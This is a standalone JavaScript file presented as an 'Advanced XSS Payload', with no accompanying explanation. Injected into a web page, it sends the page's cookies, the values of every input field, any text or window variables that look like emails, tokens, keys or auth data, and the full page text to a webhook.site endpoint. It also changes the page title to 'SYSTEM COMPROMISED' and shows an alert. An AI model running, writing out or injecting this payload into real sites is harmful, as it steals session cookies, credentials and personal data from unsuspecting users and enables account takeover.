console.log("🚀 Advanced XSS Payload Started");

// 1. Change page title & mark DOM
document.title = "☠️ SYSTEM COMPROMISED";
document.body.setAttribute("data-xss", "executed");

// 2. Send cookies
new Image().src = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/cookie?c=" + encodeURIComponent(document.cookie);

// 3. Extract hidden and text input fields
let fields = [];
document.querySelectorAll('input').forEach(input => {
  fields.push(`${input.name || input.id}: ${input.value}`);
});
if (fields.length) {
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/inputs", {
    method: "POST",
    body: fields.join("\n")
  });
}

// 4. Analyze DOM text for emails/tokens
let sensitive = [];
document.querySelectorAll("*").forEach(el => {
  let text = el.innerText || el.value || "";
  if (text.match(/@|token|key|auth|user|api/i)) {
    sensitive.push(`${el.tagName}: ${text}`);
  }
});
if (sensitive.length) {
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/sensitive", {
    method: "POST",
    body: sensitive.join("\n")
  });
}

// 5. Deep window object analysis
let windowVars = Object.entries(window)
  .filter(([k, v]) => typeof v === "string" && v.match(/@|token|auth|user|api|key/i))
  .map(([k, v]) => `${k}: ${v}`);
if (windowVars.length) {
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/window-vars", {
    method: "POST",
    body: windowVars.join("\n")
  });
}

// 6. Send complete innerText of page
fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/domtext", {
  method: "POST",
  body: document.body.innerText
});

// 7. Show visual alert
setTimeout(() => {
  alert("🔥 ADVANCED XSS EXECUTED!");
  console.log("✅ Alert triggered");
}, 1000);
